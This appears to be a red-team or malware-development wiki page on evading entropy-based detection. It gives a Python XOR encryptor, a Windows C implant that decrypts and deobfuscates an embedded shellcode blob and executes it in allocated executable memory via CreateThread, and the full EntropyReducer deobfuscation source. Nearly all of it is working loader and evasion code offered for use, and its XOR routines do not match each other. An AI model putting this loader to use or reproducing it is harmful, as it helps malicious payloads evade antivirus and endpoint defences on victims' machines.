# Entropy

[Entropy](https://en.wikipedia.org/wiki/Entropy_\(information_theory\)) refers to the degree of randomness within a provided data set. Various types of entropy measures exist, such as Gibbs Entropy, Boltzmann Entropy, and Rényi Entropy. However, in the context of cybersecurity, the term entropy typically refers to Shannon's Entropy, which produces a value between 0 and 8. As the level of randomness in the dataset increases, so does the entropy value.

Malware binary files will generally have a higher entropy value than ordinary files. High entropy is typically an indicator of compressed, encrypted or packed data, which is often used by malware to hide signatures. Compressed, encrypted, or packed data usually generates a large amount of randomised output, which explains why entropy is higher in malware files.

{% embed url="https://github.com/Maldev-Academy/EntropyReducer" %}

```batch
.\EntropyReducer.c notepad.bin
python3 xor.py notepad.bin.ER 
xxd -i output.raw 
```

### xor.py

```python
import sys

KEY = "mysecretkey"


def xor(data, key):
    key = str(key)
    l = len(key)
    output = bytearray()

    for i in range(len(data)):
        current = data[i]  # Byte value (integer)
        current_key = key[i % len(key)]
        output.append(current ^ ord(current_key))  # XOR byte with key char

    return output  # Return bytearray


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)

# Write the raw shellcode to output.raw
with open("output.raw", "wb") as f:
    f.write(ciphertext)

```

### implant.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#include "EntropyReducer.h"

unsigned char output_raw[] = {
  0x6d, 0x79, 0x73, 0x2d, 0x63, 0x66, 0x65, 0x74, 0x6b, 0x65, 0x79, 0x6d,
  0x79, 0x73, 0x51, 0x63, 0x72, 0x65, 0x75, 0x6a, 0x65, 0x79, 0x6d, 0x4f,
  0x73, 0x65, 0x63, 0x3e, 0x66, 0x38, 0x4f, 0x65, 0x58, 0x6d, 0x79, 0x73,
  0xa4, 0xaa, 0x7f, 0x24, 0x74, 0x65, 0x65, 0x79, 0x6d, 0x7b, 0x5f, 0x45,
  0x22, 0x72, 0x68, 0x74, 0x6b, 0x65, 0x6a, 0x1f, 0x16, 0x19, 0x65, 0x23,
  0x72, 0x65, 0x74, 0x43, 0x59, 0x7f, 0x11, 0x79, 0x4e, 0x65, 0x63, 0x72,
  0x35, 0x3c, 0x64, 0xd2, 0x79, 0x64, 0x79, 0x73, 0x65, 0x0c, 0xf5, 0x9a,
  0xa1, 0x6b, 0x5d, 0x79, 0x6d, 0x79, 0x73, 0x3c, 0x22, 0xfb, 0x65, 0x35,
  0x6b, 0x65, 0x79, 0x15, 0x1c, 0x73, 0x65, 0x63, 0x37, 0x65, 0x74, 0x6b,
  0xb0, 0x31, 0xee, 0xbd, 0x73, 0x59, 0x63, 0x72, 0x65, 0x75, 0xaa, 0x87,
  0x94, 0x6d, 0x76, 0x73, 0x65, 0x63, 0x13, 0x01, 0x5a, 0x0e, 0x65, 0x3d,
  0x6d, 0x79, 0x73, 0xc9, 0x22, 0xb3, 0xac, 0x74, 0x75, 0x65, 0x79, 0x6d,
  0x2f, 0x3b, 0x54, 0xb1, 0x72, 0x61, 0x74, 0x6b, 0x65, 0xfc, 0xad, 0x0d,
  0x14, 0x65, 0x76, 0x72, 0x65, 0x74, 0x6a, 0xb5, 0x9a, 0x3b, 0x79, 0x6a,
  0x65, 0x63, 0x72, 0x27, 0x48, 0x23, 0x64, 0x79, 0x7f, 0x79, 0x73, 0x65,
  0x9f, 0x3a, 0xe6, 0x90, 0x6b, 0x65, 0x79, 0x6d, 0x79, 0xf8, 0x51, 0xeb,
  0x3a, 0x65, 0x6f, 0x6b, 0x65, 0x79, 0x6d, 0x79, 0x32, 0x34, 0x63, 0x70,
  0x65, 0x74, 0x6b, 0x37, 0x38, 0x3c, 0x31, 0x73, 0x75, 0x63, 0x72, 0x65,
  0x35, 0x3b, 0x37, 0x28, 0x6d, 0x7a, 0x73, 0x65, 0x63, 0x8d, 0x85, 0x2c,
  0x2a, 0x65, 0x56, 0x6d, 0x79, 0x73, 0x3c, 0x39, 0x3a, 0xee, 0x74, 0x5b,
  0x65, 0x79, 0x6d, 0x33, 0x39, 0x28, 0x52, 0x72, 0x6f, 0x74, 0x6b, 0x65,
  0x74, 0x2c, 0x78, 0xb2, 0x65, 0x7c, 0x72, 0x65, 0x74, 0x2a, 0x3f, 0x31,
  0xee, 0x79, 0x5e, 0x65, 0x63, 0x72, 0x24, 0x2c, 0x2a, 0x3c, 0x79, 0x41,
  0x79, 0x73, 0x65, 0x9c, 0x8d, 0x38, 0x3c, 0x6b, 0x57, 0x79, 0x6d, 0x79,
  0x2b, 0x3b, 0x3a, 0x28, 0x65, 0x5f, 0x6b, 0x65, 0x79, 0x67, 0xf9, 0x88,
  0x85, 0x63, 0x4c, 0x65, 0x74, 0x6b, 0x6d, 0x3c, 0x54, 0xa8, 0x73, 0x47,
  0x63, 0x72, 0x65, 0x3c, 0x94, 0xac, 0x38, 0x6d, 0x63, 0x73, 0x65, 0x63,
  0x1d, 0x11, 0x11, 0x1b, 0x65, 0x3a, 0x6d, 0x79, 0x73, 0x89, 0x43, 0x33,
  0x37, 0x74, 0x45, 0x65, 0x79, 0x6d, 0x78, 0xa3, 0x24, 0xe8, 0x72, 0x4d,
  0x74, 0x6b, 0x65, 0x31, 0x6c, 0xa9, 0x23, 0x65, 0x75, 0x72, 0x65, 0x74,
  0x6a, 0xb3, 0x34, 0x5c, 0x79, 0x6f, 0x65, 0x63, 0x72, 0x05, 0x3c, 0xe0,
  0x37, 0x79, 0x6b, 0x79, 0x73, 0x65, 0x06, 0x3a, 0xee, 0x26, 0x6b, 0x60,
  0x79, 0x6d, 0x79, 0x61, 0x8c, 0x34, 0x8d, 0x65, 0x45, 0x6b, 0x65, 0x79,
  0x55, 0x99, 0x06, 0x94, 0x63, 0x52, 0x65, 0x74, 0x6b, 0x33, 0x38, 0xd7,
  0xdf, 0x73, 0x5f, 0x63, 0x72, 0x65, 0xbd, 0x23, 0x54, 0xb9, 0x6d, 0x72,
  0x73, 0x65, 0x63, 0xbb, 0x2d, 0x45, 0xab, 0x65, 0x64, 0x6d, 0x79, 0x73,
  0xf0, 0xde, 0xef, 0x9a, 0x74, 0x50, 0x65, 0x79, 0x6d, 0x78, 0xa3, 0x03,
  0x22, 0x72, 0x40, 0x74, 0x6b, 0x65, 0xc3, 0x6c, 0x79, 0x73, 0x65, 0x50,
  0x72, 0x65, 0x74, 0x6f, 0xed, 0x31, 0x6c, 0x79, 0x5a, 0x65, 0x63, 0x72,
  0x65, 0x3c, 0xe6, 0xe8, 0x79, 0x58, 0x79, 0x73, 0x65, 0xb3, 0x33, 0x3d,
  0x35, 0x6b, 0x4f, 0x79, 0x6d, 0x79, 0x32, 0xdf, 0x52, 0xf9, 0x65, 0x43,
  0x6b, 0x65, 0x79, 0x18, 0x7c, 0xc8, 0x22, 0x63, 0x4d, 0x65, 0x74, 0x6b,
  0xee, 0x75, 0x25, 0x3d, 0x73, 0x43, 0x63, 0x72, 0x65, 0xff, 0x2b, 0x79,
  0x30, 0x6d, 0x5e, 0x73, 0x65, 0x63, 0x82, 0x8d, 0xb4, 0x6b, 0x65, 0x78,
  0x6d, 0x79, 0x73, 0x7d, 0x2b, 0xf9, 0x37, 0x74, 0x6c, 0x65, 0x79, 0x6d,
  0xa9, 0xf8, 0xe5, 0xeb, 0x72, 0x76, 0x74, 0x6b, 0x65, 0xf2, 0x25, 0x61,
  0x37, 0x65, 0x74, 0x72, 0x65, 0x74, 0x4b, 0x2d, 0xf2, 0x1f, 0x79, 0x7b,
  0x65, 0x63, 0x72, 0xee, 0x34, 0x4b, 0x2c, 0x79, 0x75, 0x79, 0x73, 0x65,
  0xe8, 0x32, 0x41, 0x3d, 0x6b, 0x41, 0x79, 0x6d, 0x79, 0xa9, 0x9a, 0xb6,
  0x1c, 0x65, 0x36, 0x6b, 0x65, 0x79, 0xc1, 0x45, 0x12, 0x19, 0x63, 0x7e,
  0x65, 0x74, 0x6b, 0x10, 0xa1, 0x35, 0x3d, 0x73, 0x46, 0x63, 0x72, 0x65,
  0xff, 0x39, 0x45, 0xf2, 0x6d, 0x68, 0x73, 0x65, 0x63, 0xc9, 0x95, 0xc1,
  0xc9, 0x65, 0x40, 0x6d, 0x79, 0x73
};

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
unsigned int output_raw_len = 630;
int main() {
	PVOID exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect;
	SIZE_T	payload_len = NULL;
	PBYTE	payload = NULL;

	
	char key[] = "mysecretkey";
	XOR((char*)output_raw, output_raw_len, key, sizeof(key));
	printf("Decrypted payload at: %p\n", output_raw);
	getchar();

	Deobfuscate(output_raw, output_raw_len, &payload, &payload_len);
	printf("Deobfuscated payload at: %p, size: %zu\n", payload, payload_len);
	getchar();

	exec_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("Allocated memory at: %p\n", exec_mem);

	RtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if (rv != 0) {
		th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
		WaitForSingleObject(th, -1);
	}
	return 0;
}
```

### EntropyReducer.c

```c
#include <Windows.h>
#include <stdio.h>


#include "EntropyReducer.h"


struct LINKED_LIST;
typedef struct _LINKED_LIST
{
    BYTE					pBuffer[BUFF_SIZE];	    // payload's bytes
    BYTE					pNull[NULL_BYTES];	    // null padded bytes
    INT						ID;						// node id
    struct LINKED_LIST* Next;					    // next node pointer	

}LINKED_LIST, * PLINKED_LIST;

// this will represent the seraizlized size of one node
#define SERIALIZED_SIZE			(BUFF_SIZE + NULL_BYTES + sizeof(INT))	

// serialized payload size:		SERIALIZED_SIZE * (number of nodes)
// number of nodes: (padded payload size) / BUFF_SIZE

typedef enum SORT_TYPE {
    SORT_BY_ID,
    SORT_BY_BUFFER
};


// set the 'sPayloadSize' variable to be equal to the next nearest number that is multiple of 'N'
#define NEAREST_MULTIPLE(sPayloadSize, N)(SIZE_T)((SIZE_T)sPayloadSize + (int)N - ((SIZE_T)sPayloadSize % (int)N))


// used to insert a node at the end of the given linked list
// - LinkedList: a variable pointing to a 'LINKED_LIST' structure, this will represent the linked list head, this variable can be NULL, and thus will be initialized here
// - pBuffer: the payload chunk (of size 'BUFF_SIZE')
// - ID: the id of the node 
PLINKED_LIST InsertAtTheEnd(IN OUT PLINKED_LIST LinkedList, IN PBYTE pBuffer, IN INT ID)
{

    // new tmp pointer, pointing to the head of the linked list
    PLINKED_LIST pTmpHead = (PLINKED_LIST)LinkedList;

    // creating a new node
    PLINKED_LIST pNewNode = (PLINKED_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LINKED_LIST));
    if (!pNewNode)
        return NULL;
    memcpy(pNewNode->pBuffer, pBuffer, BUFF_SIZE);
    pNewNode->ID = ID;
    pNewNode->Next = NULL;

    // if the head is null, it will start at the new node we created earlier
    if (LinkedList == NULL) {
        LinkedList = pNewNode;
        return LinkedList;
    }

    // else we will keep walking down the linked list till we find an empty node 
    while (pTmpHead->Next != NULL)
        pTmpHead = pTmpHead->Next;

    // pTmpHead now is the last node in the linked list
    // setting the 'Next' value to the new node
    pTmpHead->Next = pNewNode;

    // returning the head of the linked list
    return LinkedList;
}


// covert raw payload bytes to a linked list
// - pPayload: Base Address of the payload
// - sPayloadSize: pointer to a SIZE_T variable that holds the size of the payload, it will be set to the serialized size of the linked list
// - ppLinkedList: pointer to a LINKED_LIST structure, that will represent the head of the linked list
BOOL InitializePayloadList(IN PBYTE pPayload, IN OUT PSIZE_T sPayloadSize, OUT PLINKED_LIST* ppLinkedList)
{

    // variable used to count the linked list elements (used to calculate the final size)
    // it is also used as the node's ID
    unsigned int x = 0;


    // setting the payload size to be multiple of 'BUFF_SIZE'
    SIZE_T	sTmpSize = NEAREST_MULTIPLE(*sPayloadSize, BUFF_SIZE);
    if (!sTmpSize)
        return FALSE;

    // new padded buffer 
    PBYTE	pTmpBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpSize);
    if (!pTmpBuffer)
        return FALSE;

    memcpy(pTmpBuffer, pPayload, *sPayloadSize);

    // for each 'BUFF_SIZE' in the padded payload, add it to the linked list
    for (int i = 0; i < sTmpSize; i++) {
        if (i % BUFF_SIZE == 0) {
            *ppLinkedList = InsertAtTheEnd((PLINKED_LIST)*ppLinkedList, &pTmpBuffer[i], x);
            x++;
        }
    }

    // updating the size to be the size of the whole *serialized* linked list
    *sPayloadSize = SERIALIZED_SIZE * x;

    // if the head is null
    if (*ppLinkedList == NULL)
        return FALSE;

    return TRUE;
}


//------------------------------------------------------------------------------------------------------------------------------------------------------
// the following is the mergesort algorithm implementation

// split the nodes of the list into two sublists
void Split(PLINKED_LIST top, PLINKED_LIST* front, PLINKED_LIST* back) {
    PLINKED_LIST fast = top->Next;
    PLINKED_LIST slow = top;

    /* fast pointer advances two nodes, slow pointer advances one node */
    while (fast != NULL) {
        fast = fast->Next;		/* "fast" moves on first time */
        if (fast != NULL) {
            slow = slow->Next;	/* "slow" moves on first time */
            fast = fast->Next;	/* "fast" moves on second time */
        }
    }

    /* "slow" is before the middle in the list, so split it in two at that point */
    *front = top;
    *back = slow->Next;
    slow->Next = NULL;			/* end of the input list */
}


// merge two linked lists 
PLINKED_LIST Merge(PLINKED_LIST top1, PLINKED_LIST top2, enum SORT_TYPE eType) {
    if (top1 == NULL)
        return top2;
    else
        if (top2 == NULL)
            return top1;

    PLINKED_LIST pnt = NULL;

    int iValue1 = 0;
    int iValue2 = 0;

    switch (eType) {
        // this is used to deobfuscate
    case SORT_BY_ID: {
        iValue1 = (int)top1->ID;
        iValue2 = (int)top2->ID;
        break;
    }
                   // this is used to obfuscate
    case SORT_BY_BUFFER: {
        iValue1 = (int)(top1->pBuffer[0] ^ top1->pBuffer[1] ^ top1->pBuffer[2]);   // calculating a value from the payload buffer chunk
        iValue2 = (int)(top2->pBuffer[0] ^ top2->pBuffer[1] ^ top2->pBuffer[2]);   // calculating a value from the payload buffer chunk
        break;
    }
    default: {
        return NULL;
    }
    }

    /* pick either top1 or top2, and merge them */
    if (iValue1 <= iValue2) {
        pnt = top1;
        pnt->Next = Merge(top1->Next, top2, eType);
    }
    else {
        pnt = top2;
        pnt->Next = Merge(top1, top2->Next, eType);
    }
    return pnt;
}


// the main sorting function
// - pLinkedList : is the head node of the linked list
// - eType :
//      * is set to SORT_BY_BUFFER to obfuscate
//      * is set to SORT_BY_ID to deobfuscate
VOID MergeSort(PLINKED_LIST* top, enum SORT_TYPE eType) {
    PLINKED_LIST tmp = *top, * a, * b;

    if (tmp != NULL && tmp->Next != NULL) {
        Split(tmp, &a, &b);				/* (divide) split head into "a" and "b" sublists */

        /* (conquer) sort the sublists */
        MergeSort(&a, eType);
        MergeSort(&b, eType);

        *top = Merge(a, b, eType);				/* (combine) merge the two sorted lists together */
    }
}


//------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL Deobfuscate(IN PBYTE pFuscatedBuff, IN SIZE_T sFuscatedSize, OUT PBYTE* ptPayload, OUT PSIZE_T psSize)
{
    PLINKED_LIST	pLinkedList = NULL;

    // deserialize (from buffer to linked list - this must be done to re-order the payload's bytes)
    for (size_t i = 0; i < sFuscatedSize; i++) {
        if (i % SERIALIZED_SIZE == 0)
            pLinkedList = InsertAtTheEnd(pLinkedList, &pFuscatedBuff[i], *(int*)&pFuscatedBuff[i + BUFF_SIZE + NULL_BYTES]);
    }

    // re-ordering the payload's bytes
    MergeSort(&pLinkedList, SORT_BY_ID);

    PLINKED_LIST	pTmpHead = pLinkedList;
    SIZE_T			BufferSize = NULL;
    PBYTE			BufferBytes = (PBYTE)LocalAlloc(LPTR, BUFF_SIZE);
    unsigned int	x = 0x00;

    while (pTmpHead != NULL) {

        BYTE TmpBuffer[BUFF_SIZE] = { 0 };

        // copying the 'pBuffer' element from each node
        memcpy(TmpBuffer, pTmpHead->pBuffer, BUFF_SIZE);

        BufferSize += BUFF_SIZE;

        // reallocating to fit the new buffer
        if (BufferBytes != NULL) {
            BufferBytes = (PBYTE)LocalReAlloc(BufferBytes, BufferSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
            memcpy((PVOID)(BufferBytes + (BufferSize - BUFF_SIZE)), TmpBuffer, BUFF_SIZE);
        }

        pTmpHead = pTmpHead->Next;
        x++; // number if nodes
    }

    *ptPayload = BufferBytes;  // payload base address 
    *psSize = x * BUFF_SIZE; // payload size


    // free linked list's nodes
    pTmpHead = pLinkedList;
    PLINKED_LIST pTmpHead2 = pTmpHead->Next;

    while (pTmpHead2 != NULL) {

        if (!HeapFree(GetProcessHeap(), 0, (PVOID)pTmpHead)) {
            // failed
        }
        pTmpHead = pTmpHead2;
        pTmpHead2 = pTmpHead2->Next;
    }



    if (*ptPayload != NULL && *psSize < sFuscatedSize)
        return 1;
    else
        return 0;
}



```

### EntropyReducer.h

```c
#pragma once

#include <Windows.h>


#ifndef HELPER_H
#define HELPER_H

// these values should be the same as 'EntropyReducer.exe'
// if you modified them there, you need to modify these here as well
#define BUFF_SIZE				0x04			
#define NULL_BYTES				0x01			


// Deobfuscate the payload
// - pFuscatedBuff: base address of the obfuscated payload
// - sFuscatedSize: the size of the obfuscated payload
// - ptPayload: pointer to a PBYTE variable that will recieve the deobfuscated payload base address
// - psSize: pointer to a PSIZE_T variable that will recieve the deobfuscated payload size
BOOL Deobfuscate(IN PBYTE pFuscatedBuff, IN SIZE_T sFuscatedSize, OUT PBYTE* ptPayload, OUT PSIZE_T psSize);


#endif // !HELPER_H

```
